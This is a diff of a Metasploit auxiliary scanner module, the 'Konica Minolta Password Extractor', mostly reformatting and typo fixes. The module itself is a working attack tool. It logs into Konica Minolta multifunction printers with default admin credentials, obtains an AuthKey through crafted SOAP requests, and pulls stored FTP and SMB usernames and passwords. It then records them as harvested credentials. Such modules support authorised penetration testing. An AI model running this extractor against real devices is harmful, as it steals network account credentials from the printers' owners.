@@ -1,10 +1,7 @@
-#
-# This module requires Metasploit: http://metasploit.com/download
+##
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'rex/proto/http'
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
@@ -12,29 +9,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Konica Minolta Password Extractor',
-      'Description' => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Konica Minolta Password Extractor',
+        'Description' => %q{
           This module will extract FTP and SMB account usernames and passwords
           from Konica Minolta multifunction printer (MFP) devices. Tested models include
           C224, C280, 283, C353, C360, 363, 420, C452, C452, C452, C454e, and C554.
         },
-      'Author'      =>
-        [
+        'Author' => [
           'Deral "Percentx" Heiland',
           'Pete "Bokojan" Arzamendi'
         ],
-      'License'     => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT('50001'),
-        OptString.new('USER', [false, 'The default Admin user', 'Admin']),
+        OptString.new('USER', [true, 'The default Admin user', 'Admin']),
         OptString.new('PASSWD', [true, 'The default Admin password', '12345678']),
         OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])
 
-      ], self.class)
+      ]
+    )
   end
 
   # Creates the XML data to be sent that will extract AuthKey
@@ -46,13 +51,13 @@ class MetasploitModule < Msf::Auxiliary
                'xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope/',
                'xmlns:SOAP-ENC' => 'http://schemas.xmlsoap.org/soap/encoding/',
                'xmlns:xsi' => 'http://www.w3.org/2001/XMLSchema-instance',
-               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema'){
-        xml.send('SOAP-ENV:Header'){
-          xml.send('me:AppReqHeader', 'xmlns:me' => "http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}"){
+               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema') {
+        xml.send('SOAP-ENV:Header') {
+          xml.send('me:AppReqHeader', 'xmlns:me' => "http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}") {
             xml.send('ApplicationID', 'xmlns' => '') { xml.text '0' }
             xml.send('UserName', 'xmlns' => '') { xml.text '' }
             xml.send('Password', 'xmlns' => '') { xml.text '' }
-            xml.send('Version', 'xmlns' => ''){
+            xml.send('Version', 'xmlns' => '') {
               xml.send('Major') { xml.text "#{major}" }
               xml.send('Minor') { xml.text "#{minor}" }
             }
@@ -60,8 +65,8 @@ class MetasploitModule < Msf::Auxiliary
           }
         }
         xml.send('SOAP-ENV:Body') {
-          xml.send('AppReqLogin', 'xmlns' => "http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}"){
-            xml.send('OperatorInfo'){
+          xml.send('AppReqLogin', 'xmlns' => "http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}") {
+            xml.send('OperatorInfo') {
               xml.send('UserType') { xml.text "#{user}" }
               xml.send('Password') { xml.text "#{passwd}" }
             }
@@ -79,30 +84,30 @@ class MetasploitModule < Msf::Auxiliary
                'xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope/',
                'xmlns:SOAP-ENC' => 'http://schemas.xmlsoap.org/soap/encoding/',
                'xmlns:xsi' => 'http://www.w3.org/2001/XMLSchema-instance',
-               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema'){
-        xml.send('SOAP-ENV:Header'){
-          xml.send('me:AppReqHeader', 'xmlns:me' => "http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}"){
+               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema') {
+        xml.send('SOAP-ENV:Header') {
+          xml.send('me:AppReqHeader', 'xmlns:me' => "http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}") {
             xml.send('ApplicationID', 'xmlns' => '') { xml.text '0' }
             xml.send('UserName', 'xmlns' => '') { xml.text '' }
             xml.send('Password', 'xmlns' => '') { xml.text '' }
-            xml.send('Version', 'xmlns' => ''){
+            xml.send('Version', 'xmlns' => '') {
               xml.send('Major') { xml.text "#{major}" }
               xml.send('Minor') { xml.text "#{minor}" }
             }
             xml.send('AppManagementID', 'xmlns' => '') { xml.text '1000' }
           }
         }
-        xml.send('SOAP-ENV:Body'){
-          xml.send('AppReqGetAbbr', 'xmlns' => "http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}"){
-            xml.send('OperatorInfo'){
+        xml.send('SOAP-ENV:Body') {
+          xml.send('AppReqGetAbbr', 'xmlns' => "http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}") {
+            xml.send('OperatorInfo') {
               xml.send('AuthKey') { xml.text "#{authkey}" }
             }
-            xml.send('AbbrListCondition'){
+            xml.send('AbbrListCondition') {
               xml.send('SearchKey') { xml.text 'None' }
-              xml.send('WellUse') {  xml.text 'false' }
-              xml.send('ObtainCondition'){
+              xml.send('WellUse') { xml.text 'false' }
+              xml.send('ObtainCondition') {
                 xml.send('Type') { xml.text 'OffsetList' }
-                xml.send('OffsetRange'){
+                xml.send('OffsetRange') {
                   xml.send('Start') { xml.text '1' }
                   xml.send('Length') { xml.text '100' }
                 }
@@ -125,13 +130,14 @@ class MetasploitModule < Msf::Auxiliary
   # Validate XML Major Minor version
   def version
     response = send_request_cgi(
-    {
-      'uri'    => '/',
-      'method' => 'POST',
-      'data'   => '<SOAP-ENV:Envelope></SOAP-ENV:Envelope>'
-    }, datastore['TIMEOUT'].to_i)
+      {
+        'uri' => '/',
+        'method' => 'POST',
+        'data' => '<SOAP-ENV:Envelope></SOAP-ENV:Envelope>'
+      }, datastore['TIMEOUT'].to_i
+    )
     if response.nil?
-      print_error("No reponse from device")
+      print_error("No response from device")
       return
     else
       xml0_body = ::Nokogiri::XML(response.body)
@@ -141,24 +147,24 @@ class MetasploitModule < Msf::Auxiliary
       minor = ("#{minor_parse}")
       login(major, minor)
     end
-
-    rescue ::Rex::ConnectionError
-      print_error("Version check Connection failed.")
+  rescue ::Rex::ConnectionError
+    print_error("Version check Connection failed")
   end
 
   # This section logs on and retrieves AuthKey token
   def login(major, minor)
     authreq_xml = generate_authkey_request_xlm(major, minor)
-    # Send post request with crafted XML to login and retreive AuthKey
+    # Send post request with crafted XML to login and retrieve AuthKey
     begin
       response = send_request_cgi(
-      {
-        'uri'    => '/',
-        'method' => 'POST',
-        'data'   => authreq_xml.to_xml
-      }, datastore['TIMEOUT'].to_i)
+        {
+          'uri' => '/',
+          'method' => 'POST',
+          'data' => authreq_xml.to_xml
+        }, datastore['TIMEOUT'].to_i
+      )
       if response.nil?
-        print_error("No reponse from device")
+        print_error("No response from device")
         return
       else
         xml1_body = ::Nokogiri::XML(response.body)
@@ -167,25 +173,26 @@ class MetasploitModule < Msf::Auxiliary
         extract(major, minor, authkey)
       end
     rescue ::Rex::ConnectionError
-      print_error("Login Connection failed.")
+      print_error("Login Connection failed")
     end
   end
 
   # This section post xml soap message that will extract usernames and passwords
   def extract(major, minor, authkey)
     if (authkey != '')
-      # create xml request to extract user credintial settings
+      # create xml request to extract user credential settings
       smbreq_xml = generate_pwd_request_xlm(major, minor, authkey)
       # Send post request with crafted XML as data
       begin
         response = send_request_cgi(
-        {
-          'uri'    => '/',
-          'method' => 'POST',
-          'data'   => smbreq_xml.to_xml
-        }, datastore['TIMEOUT'].to_i)
+          {
+            'uri' => '/',
+            'method' => 'POST',
+            'data' => smbreq_xml.to_xml
+          }, datastore['TIMEOUT'].to_i
+        )
         if response.nil?
-          print_error("No reponse from device")
+          print_error("No response from device")
           return
         else
           xml2_body = ::Nokogiri::XML(response.body)
@@ -221,7 +228,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
     else
-      print_status('No AuthKey returned possible causes Authentication failed or unsupported Konica model')
+      print_error('No AuthKey returned possible causes Authentication failed or unsupported Konica model')
       return
     end
   end
@@ -230,7 +237,7 @@ class MetasploitModule < Msf::Auxiliary
     credential_data = {
       origin_type: :service,
       module_fullname: self.fullname,
-      workspace_id: myworkspace.id,
+      workspace_id: myworkspace_id,
       private_data: password,
       private_type: :password,
       username: username
